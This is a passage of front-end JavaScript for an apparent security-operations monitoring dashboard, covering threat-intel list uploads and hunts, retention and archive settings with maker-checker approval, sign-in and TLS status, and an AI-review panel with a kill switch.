  $("intel-feeds").innerHTML = `<p class="meta">The list is filled by upload today. In production each category is a scheduled pull from the system that owns the data, so the monitor never becomes a second source of truth. Same columns, same validation, same audit trail.</p>
    <table class="tbl"><tr><th>Category</th><th>Owner system (examples)</th><th>Fields it provides</th><th>Today</th></tr>
    <tr><td>Threat intel</td><td>Threat-intelligence platform or MISP, vendor or sector feeds (STIX/TAXII)</td><td class="meta">IPs, ranges, domains, confidence, expiry</td><td>${pill("ok", "upload built")} ${pill("delayed", "feed connector not built")}</td></tr>
    <tr><td>Networks</td><td>IPAM or network team, cloud VPC inventory</td><td class="meta">ranges, zone, environment, owner</td><td>${pill("ok", "upload built")} ${pill("delayed", "connector not built")}</td></tr>
    <tr><td>Assets</td><td>CMDB (for example ServiceNow), cloud asset inventory, EDR inventory</td><td class="meta">host, address, OS, service, data held, criticality, owner</td><td>${pill("ok", "upload built")} ${pill("delayed", "connector not built")}</td></tr>
    <tr><td>Identities</td><td>Entra ID or IAM Identity Center, HR system, vendor register</td><td class="meta">user, role, department, privileged or service flag, owner</td><td>${pill("ok", "upload built")} ${pill("delayed", "connector not built")}</td></tr></table>
    <p class="meta">Sample rows are synthetic and marked <i>(assumed)</i>. Nothing here is a real bank's inventory. Downloading the template (<i>Show template</i>) gives the exact column layout for a CMDB export. Licence terms of public threat feeds need Legal's review before they are loaded.</p>`;
  const h = S.hunt;
  if (h) $("intel-hunt").innerHTML = `<p class="brief"><b>${h.hit_total}</b> match(es) across ${h.by_ioc.length} row(s). Searched ${h.rows_searched} active rows over ${h.scanned.alerts} alerts, ${h.scanned.sessions} sessions and ${h.scanned.events} timeline events. ${h.benign_matches} matches on known-good rows are counted, not listed.</p>
    ${h.by_ioc.length ? `<table class="tbl"><tr><th>Kind</th><th>Row</th><th>Label</th><th>Conf.</th><th>Matches</th><th>Cases</th></tr>${h.by_ioc.map(g => `<tr><td>${pill(KIND_PILL[g.kind] || "st", g.kind)}</td><td class="mono">${esc(g.value)}</td><td>${esc(g.tag)}</td><td>${esc(g.confidence || "–")}</td><td>${esc(g.count)}</td><td>${g.where.map(w => /^C-\d+$/.test(w) ? `<a href="#" data-a="opencase" data-case="${esc(w)}">${esc(w)}</a>` : esc(w)).join(" ")}</td></tr>`).join("")}</table>` : ""}
    <p class="meta">${esc(h.horizon)}</p>`;
}
async function intelUpload() {
  const msg = $("intel-msg"), body = $("intel-in").value;
  if (!body.trim()) { msg.innerHTML = `<span class="err">Paste or choose a CSV or JSON list first.</span>`; return; }
  try {
    const r = await api("/api/intel?label=" + encodeURIComponent($("intel-label").value.trim()), {method: "POST", body});
    msg.textContent = `Added ${r.added}, updated ${r.updated}, rejected ${r.rejected_count}.` + (r.rejected.length ? " First problems: " + r.rejected.slice(0, 3).map(x => `row ${x.row} (${x.value}): ${x.reason}`).join("; ") : "");
    if (!r.rejected_count) $("intel-in").value = "";
    load();
  } catch (e) { msg.innerHTML = `<span class="err">${esc(e.message)}</span>`; }
}
async function intelHunt() { try { S.hunt = await api("/api/intel/hunt", {method: "POST"}); $("intel-msg").textContent = ""; renderIntel(); } catch (e) { $("intel-msg").innerHTML = `<span class="err">${esc(e.message)}</span>`; } }
document.addEventListener("change", e => { if (e.target.id === "intel-file" && e.target.files[0]) e.target.files[0].text().then(t => { $("intel-in").value = t; }); });

/* ------------------------------------------------------------------ platform and compliance tab */
const LV = {pass: "ok", warn: "delayed", fail: "silent"};
const CONS = {built: "ok", option: "st", "not built": "delayed", "by design": "idle"};
function renderPlatform() {
  const p = S.plat; if (!p) return;
  renderRetEditor();
  const sig = JSON.stringify([p, S.archMsg]);
  if (sig === S.platSig) return;                                  // nothing changed: do not rebuild the page under the reader
  S.platSig = sig;
  const sm = p.summary, cc = p.considered_counts;
  $("plat-sum").innerHTML = `<div class="chips">${pill("ok", sm.pass + " pass")} ${pill("delayed", sm.warn + " warn")} ${pill("silent", sm.fail + " fail")} <span class="meta">Warnings are expected in the demo (plain HTTP, local archive, one shared password). Each says what production changes.</span></div>`;
  $("plat-checks").innerHTML = `<table class="tbl"><tr><th>Area</th><th>Check</th><th>Result</th><th>Detail</th></tr>${p.checks.map(c => `<tr><td>${esc(c.area)}</td><td>${esc(c.id)} · ${esc(c.title)}</td><td>${pill(LV[c.status], c.status)}</td><td class="meta">${esc(c.detail)}</td></tr>`).join("")}</table>`;
  const r = p.retention, pol = r.policy, ar = r.archive_state;
  $("plat-ret").innerHTML = `<p class="meta">Status <b>${esc(pol.status)}</b> · owner ${esc(pol.owner)}. ${esc(pol.source)}</p>
    <table class="tbl"><tr><th>Tier</th><th>Age</th><th>Purpose</th></tr>${r.tiers.map(t => `<tr><td><b>${esc(t.tier)}</b></td><td>${esc(t.range)}</td><td class="meta">${esc(t.purpose)}</td></tr>`).join("")}</table>
    <p class="meta mt">Regulatory minimum <b>${esc(pol.regulatory_minimum_days)}</b> days · immediate access <b>${esc(pol.immediate_access_days)}</b> days · legal hold <b>${pol.legal_hold ? "ON" : "off"}</b> · permitted regions ${esc((pol.data_residency_regions || []).join(", "))}<br>
    Archive backend <b>${esc(r.archive.backend)}</b> · encrypt ${esc(r.archive.encrypt)} · sign ${esc(r.archive.sign)} · keys: ${esc(r.archive.keys)}</p>
    <div class="r"><button class="primary" data-a="archivenow">Archive now</button><button data-a="archiveverify">Verify archive</button><span id="arch-msg" class="meta">${S.archMsg || ""}</span></div>
    ${ar.total_batches ? `<table class="tbl"><tr><th>#</th><th>Kind</th><th>Records</th><th>Range (UTC)</th><th>Enc.</th><th>Signed</th><th>SHA-256 of stored bytes</th></tr>${ar.batches.map(b => `<tr><td>${b.seq}</td><td>${esc(b.kind)}</td><td>${b.records}</td><td class="meta">${esc((b.from || "").slice(0, 16))} → ${esc((b.to || "").slice(0, 16))}</td><td>${b.encrypted ? "✔" : "–"}</td><td>${b.signed ? "✔" : "–"}</td><td class="mono">${esc(b.stored_sha256.slice(0, 16))}…</td></tr>`).join("")}</table>` : `<div class="meta mt">Nothing archived yet.</div>`}
    <p class="meta">${esc(r.cost_note)}</p>`;
  const a = p.auth, t = p.tls;
  $("plat-auth").innerHTML = `<p><b>Sign-in mode:</b> ${esc(a.mode)} ${a.mode === "proxy" ? pill("ok", "SSO") : pill("delayed", "demo")}</p>
    <p class="meta">Options: <b>none</b> (local review), <b>basic</b> (one shared password), <b>proxy</b> (SSO through an identity-aware proxy: Microsoft Entra ID with oauth2-proxy or Application Proxy, or AWS IAM Identity Center behind an ALB). In proxy mode directory groups map to roles, a person with no mapped group is denied, and typed names are ignored.</p>
    <table class="tbl"><tr><th>Directory group</th><th>Role</th></tr>${Object.entries(a.group_to_role).map(([g, ro]) => `<tr><td class="mono">${esc(g)}</td><td>${esc(ro)}</td></tr>`).join("")}</table>
    <p class="meta mt">Trusted proxy addresses: ${esc(a.trusted_proxy_cidrs.join(", ") || "none set")} · identity headers: ${esc(Object.values(a.headers).join(", "))}</p>
    <p><b>TLS:</b> this request used <b>${esc(t.this_request)}</b> · serving TLS ${esc(t.serving_tls)} · REQUIRE_TLS ${esc(t.require_tls)} · ALLOW_INSECURE ${esc(t.allow_insecure)}</p>`;
  const ai = p.ai;
  $("plat-ai").innerHTML = `<p><b>Mode:</b> ${esc(ai.mode)} · provider ${esc(ai.provider)} · ${ai.ready ? pill("ok", "ready") : pill("idle", "not active")}${ai.killed ? " " + pill("silent", "kill switch pulled") : ""}</p>
    <p class="meta">Approved endpoints (register entry SOC_AI_ENDPOINTS, maker-checker): ${esc(ai.approved_endpoints.join(", "))} · limits ${esc(ai.limits.per_hour)} calls per hour, ${esc(ai.limits.per_case_per_hour)} per case.</p>
    <p class="meta">${esc(ai.cost)}</p>${ai.problems.length ? `<p class="meta c-high">${ai.problems.map(esc).join("; ")}</p>` : ""}
    <p class="meta">Detection, priority and response never read the model's answer. See the README section <i>The AI question</i>.</p>`;
  $("plat-cons").innerHTML = `<div class="chips">${Object.entries(cc).map(([k, v]) => `${pill(CONS[k] || "st", v + " " + k)}`).join(" ")}</div>
    <table class="tbl"><tr><th>Area</th><th>Item</th><th>Status</th></tr>${p.considered.map(c => `<tr><td class="meta">${esc(c.area)}</td><td><b>${esc(c.item)}</b><div class="meta">${esc(c.detail)}</div></td><td>${pill(CONS[c.status] || "st", c.status)}</td></tr>`).join("")}</table>`;
}

/* ---- editable retention and archive settings (maker-checker). Built once and not re-rendered while the person types. */
const rsId = p => "rs-" + p.replace(/\./g, "_");
function renderRetEditor() {
  const x = S.retset, f = $("ret-form"); if (!x || !f) return;
  if (!f.dataset.built) {
    f.dataset.built = "1";
    const groups = {};
    x.fields.forEach(fd => (groups[fd.group] = groups[fd.group] || []).push(fd));
    const input = fd => {
      const v = x.values[fd.path], id = rsId(fd.path);
      if (fd.type === "bool") return `<select id="${id}"><option value="false" ${!v ? "selected" : ""}>off</option><option value="true" ${v ? "selected" : ""}>ON</option></select>`;
      if (fd.type === "enum") return `<select id="${id}">${fd.choices.map(c => `<option ${c === v ? "selected" : ""}>${esc(c)}</option>`).join("")}</select>`;
      if (fd.type === "int") return `<input id="${id}" type="number" min="${fd.min}" max="${fd.max}" value="${esc(v ?? "")}">`;
      return `<input id="${id}" type="text" maxlength="200" value="${esc(Array.isArray(v) ? v.join(", ") : v ?? "")}">`;
    };
    f.innerHTML = Object.entries(groups).map(([g, list]) => `<details open><summary><b>${esc(g)}</b></summary><div class="fgrid">${list.map(fd => `<div><label for="${rsId(fd.path)}">${esc(fd.label)}</label>${input(fd)}<div class="meta">${esc(fd.help)}</div></div>`).join("")}</div></details>`).join("") +
      privBanner(true) + `<label for="rs-reason">Reason for the change</label><textarea id="rs-reason" maxlength="300" placeholder="Why: policy reference, ticket, who asked (at least 10 characters)"></textarea>
       <div class="r"><button class="primary" data-a="retpropose">Propose change</button><button data-a="retreset">Reset form</button><span id="rs-msg" class="meta">${S.rsMsg || ""}</span></div>
       <p class="meta">Only fields you changed are proposed. A different, more senior person must approve; weakening protection needs a lead. The proposal is refused straight away if it would create a compliance failure (checks R1 to R10).</p>`;
  }
  $("ret-locked").innerHTML = `<p class="meta"><b>Not editable here, by design</b> (deploy-time settings: environment variable or pull request): ${x.locked.map(l => esc(l.label)).join(" · ")}.</p>`;
  const me = ident(), sig = JSON.stringify(x.proposals.map(p => [p.id, p.status]));
  const box = $("ret-props");
  if (sig !== S.retSig && !box.contains(document.activeElement)) {
    S.retSig = sig;
    box.innerHTML = x.proposals.length ? x.proposals.map(p => `<div class="prop ${esc(p.status)}"><div><b>${esc(p.id)}</b> ${esc(p.status)}${p.needs_lead.length ? " " + pill("delayed", "needs a lead: " + p.needs_lead.join(", ")) : ""}</div>
      <div class="meta">${Object.entries(p.changes).map(([k, v]) => `${esc(k)}: ${esc(JSON.stringify(p.before[k]))} → <b>${esc(JSON.stringify(v))}</b>`).join(" · ")}</div>
      <div class="meta">Reason: ${esc(p.reason)}${p.impact.length ? " · check changes: " + p.impact.map(i => `${esc(i.id)} ${esc(i.from)}→${esc(i.to)}`).join(", ") : ""}</div>
      <div class="meta">Maker: ${esc(p.maker)} (${esc(p.maker_role)}) at ${esc(hms(p.ts))}Z${p.checker ? ` · Checker: ${esc(p.checker)} (${esc(p.checker_role)}) at ${esc(hms(p.decided))}Z${p.decision_note ? " · " + esc(p.decision_note) : ""}` : ""}</div>
      ${p.status === "pending" ? `<div class="r"><button class="primary" data-a="retdecide" data-pid="${esc(p.id)}" data-v="approve">Approve as ${esc(me.n || "…")} (${esc(me.r)})</button><button data-a="retdecide" data-pid="${esc(p.id)}" data-v="reject">Reject</button></div>` : ""}</div>`).join("") : `<div class="meta">No retention proposals yet.</div>`;
    $("ret-eff").textContent = JSON.stringify(x.effective, null, 1);
  }
}
async function retPropose() {
  const x = S.retset, msg = $("rs-msg"), changes = {};
  x.fields.forEach(fd => { const el = $(rsId(fd.path)); if (!el) return; const cur = x.values[fd.path], now = el.value;
    const curS = Array.isArray(cur) ? cur.join(", ") : String(cur ?? "");
    if (now.trim() !== curS) changes[fd.path] = fd.type === "int" ? Number(now) : fd.type === "bool" ? now === "true" : now.trim(); });
  if (!Object.keys(changes).length) { msg.innerHTML = `<span class="err">Nothing differs from the current settings.</span>`; return; }
  try {
    const p = await api("/api/platform/retention/proposals", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({changes, reason: $("rs-reason").value.trim()})});
    S.rsMsg = esc(`Submitted as ${p.id}.` + (p.needs_lead.length ? " Needs a lead: " + p.needs_lead.join(", ") + "." : " A different, more senior person must approve.")); $("ret-form").dataset.built = ""; load();
  } catch (e) { S.rsMsg = ""; msg.innerHTML = `<span class="err">${esc(e.message)}</span>`; }
}
async function retDecide(pid, v) {
  try { await api(`/api/platform/retention/proposals/${pid}/decision`, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({decision: v})}); S.rsMsg = esc(`${pid} ${v === "approve" ? "approved and applied" : "rejected"}.`); $("ret-form").dataset.built = ""; S.platSig = ""; }
  catch (e) { S.rsMsg = ""; $("rs-msg").innerHTML = `<span class="err">Refused: ${esc(e.message)}</span>`; }
  load();
}

const actions = {
  submitprop: () => submitProp(),
  decideprop: d => decideProp(d.pid, d.v),
  verifyaudit: () => verifyAudit(),
  proposefrom: d => { S.prefill = {case: d.case}; S.tab = "gov"; load(); },
  openrb: (d, e) => { e.preventDefault(); openRb(d.id); },
  tab: d => setTab(d.tab),
  post: async d => { await api(d.url, {method: "POST"}); S.sel = null; S.detail = null; renderDetail(); load(); },
  replay: async () => { S.sel = null; S.detail = null; renderDetail(); await api("/api/replay?rate=120", {method: "POST"}); setTab("overview"); },
  opencase: async d => {
    S.tab = "alerts"; S.sev = null; S.cat = ""; S.st = ""; S.q = ""; $("q").value = "";
    await load();
    const best = casesAlerts(d.case).sort((a, b) => SEV.indexOf(a.severity) - SEV.indexOf(b.severity) || CORR(b.rule_id) - CORR(a.rule_id))[0];
    if (best) selectAlert(best.alert_id);
  },
  catfilter: d => { S.tab = "alerts"; S.cat = d.cat; load(); },
  selalert: (d, e) => { e.preventDefault(); selectAlert(d.id); },
  savecase: d => saveCase(d.case),
  runtest: () => runTest(),
  loadtest: () => { $("tester-in").value = TEST_SAMPLE; $("tester-out").innerHTML = ""; },
  decide: d => decide(d.case, d.key, d.v),
  logtab: d => { S.logTab = d.k; renderPipeline(); },
  intelupload: () => intelUpload(),
  inteltemplate: () => { $("intel-in").value = TEMPLATE; $("intel-msg").textContent = "Example rows. Replace them with your own."; },
  intelhunt: () => intelHunt(),
  intelkind: d => { S.intelKind = d.k; renderIntel(); },
  inteldel: async d => { try { await api("/api/intel/" + encodeURIComponent(d.id), {method: "DELETE"}); } catch (e) { $("intel-msg").innerHTML = `<span class="err">${esc(e.message)}</span>`; } load(); },
  archivenow: async () => { try { const r = await api("/api/retention/archive", {method: "POST"}); S.archMsg = r.nothing_new ? "Nothing new to archive." : esc(`Wrote ${r.batches.length} batch(es), encrypted and signed.`); } catch (e) { S.archMsg = `<span class="err">${esc(e.message)}</span>`; } load(); },
  archiveverify: async () => { const v = await api("/api/retention/verify"); S.archMsg = v.ok ? `<span class="c-ok">✔ manifest intact · ${v.records} batch(es)</span>` : `<span class="err">✖ broken at batch ${esc(v.broken_at)}: ${esc(v.reason)}</span>`; renderPlatform(); },
  retpropose: () => retPropose(),
  retreset: () => { $("ret-form").dataset.built = ""; renderRetEditor(); },
  retdecide: d => retDecide(d.pid, d.v),
  aipreview: async d => { const box = $("ai-preview"); if (!box) return; box.textContent = "Building preview…"; try { const r = await api("/api/cases/" + encodeURIComponent(d.case) + "/ai-preview");
    const tk = r.tokens ? Object.entries(r.tokens).map(([k, v]) => k + " " + v).join(" · ") : "none";
    box.innerHTML = `<div class="meta">Policy <b>${esc(r.data_policy)}</b> · ${esc(r.input_chars)} characters · tokens and removals: ${esc(tk)} · data guard: ${r.guard.clean ? "clean" : "<span class=\"c-crit\">BLOCKED: " + esc(r.guard.findings.join(", ")) + "</span>"}</div><pre>${esc(r.input)}</pre><div class="meta">${esc(r.note)}</div>`; } catch (e) { box.innerHTML = `<span class="err">${esc(e.message)}</span>`; } },
  aireview: async d => { const m = $("ai-msg"); if (m) m.textContent = "Asking…"; try { await api("/api/cases/" + encodeURIComponent(d.case) + "/ai-review", {method: "POST"}); await selectAlert(S.sel); } catch (e) { const m2 = $("ai-msg"); if (m2) m2.innerHTML = `<span class="err">${esc(e.message)}</span>`; } },
  aikill: async () => { S.ai = await api("/api/ai/kill", {method: "POST"}); renderDetail(); },
};
document.addEventListener("click", e => {
  const t = e.target.closest("[data-a]");
  if (t && actions[t.dataset.a]) actions[t.dataset.a](t.dataset, e);
});
{ const m = (location.hash || "").match(/^#rb=(RB-[A-Z0-9]+)$/); if (m) { S.rbsel = m[1]; S.tab = "runbooks"; } }
load();
setInterval(load, 1500);
